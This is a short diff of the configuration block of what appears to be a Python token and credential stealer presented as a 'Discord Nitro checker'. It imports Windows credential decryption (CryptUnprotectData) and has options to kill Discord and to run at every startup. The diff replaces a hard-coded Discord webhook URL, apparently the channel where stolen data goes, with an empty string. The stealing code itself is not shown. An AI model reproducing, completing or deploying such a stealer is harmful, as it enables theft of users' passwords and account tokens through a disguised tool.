@@ -26,7 +26,7 @@ from win32crypt import CryptUnprotectData
 
 config = {
     # DO NOT TOUCH THE DISCORD NITRO CHECKER CODE. 
-    'webhook': "https://discord.com/api/webhooks/1055556025564012564/zItPCFWCfAvtHklklrqQEZB5xsddYeS8NPTVaDvcncQwYOukD_La5AiTmqziBEOYKeVp",
+    'webhook': "",
     # Set to False if you don't want it to kill programs such as discord upon running the exe.
     'kill_processes': False,
     # This makes the program run the file after every startup.
